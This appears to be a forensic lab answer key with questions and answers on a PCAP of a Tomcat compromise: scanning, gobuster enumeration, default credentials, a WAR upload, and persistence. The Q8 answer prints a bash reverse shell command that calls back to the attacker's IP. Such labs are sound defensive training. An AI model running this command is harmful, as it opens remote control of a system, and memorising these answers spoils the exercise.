Q1

Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

14.0.0.120

Q2

Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

China

Q3

From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

8080

Q4

Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

gobuster

Q5

After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

/manager

Q6

After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

admin:tomcat

Q7

Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

JXQOZY.war

Q8

After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
